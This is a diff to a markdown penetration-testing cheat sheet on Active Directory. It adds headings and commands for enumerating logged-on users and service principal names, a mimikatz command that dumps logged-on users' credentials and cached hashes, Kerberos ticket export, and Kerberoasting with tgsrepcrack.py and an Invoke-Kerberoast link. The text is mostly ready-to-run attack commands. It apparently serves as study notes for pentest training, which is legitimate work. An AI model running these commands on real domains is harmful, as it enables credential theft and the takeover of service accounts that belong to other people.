@@ -61,7 +61,7 @@ https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
 
 
 ## Active Directory
-## Enumeration
+### Enumeration
 
 -> Enumerates all local accounts
 ```
@@ -123,6 +123,8 @@ Foreach($obj in $Result)
 }
 ```
 
+#### Users currently logged on
+
 -> Enumerate logged users
 ```
 Import-Module .\PowerView.ps1
@@ -134,6 +136,7 @@ Get-NetLoggedon -ComputerName <computer_name>
 Get-NetSession -ComputerName dc1
 ```
 
+#### Enumeration Through Service Principal Names
 -> PowerShell enumeration script to filter the serviceprincipalname property to the string *http*
 ```
 $domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
@@ -166,11 +169,9 @@ Foreach($obj in $Result)
 }
 ```
 
+or
 
-
-
-
-
+https://raw.githubusercontent.com/compwiz32/PowerShell/master/Get-SPN.ps1
 
 ### Cached Credential Storage and Retrieval
 -> Dump the credentials of all connected users, including cached hashes
@@ -178,7 +179,30 @@ Foreach($obj in $Result)
 mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
 ```
 
--> show Offsec user tickets that are stored in memory
+### Service Account Attacks
+
+-> Sow user tickets that are stored in memory
 ```
 mimikatz.exe "sekurlsa::tickets"
 ```
+
+-> Display all cached Kerberos tickets for the current user
+
+```
+klist
+```
+
+-> Export service tickets from memory
+```
+kerberos::list /export
+```
+
+-> Wordlist Attack with tgsrepcrack.py to get the clear text password for the service account
+```
+sudo apt update && sudo apt install kerberoast
+python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt <ticket.kirbi>
+```
+
+or  
+
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1
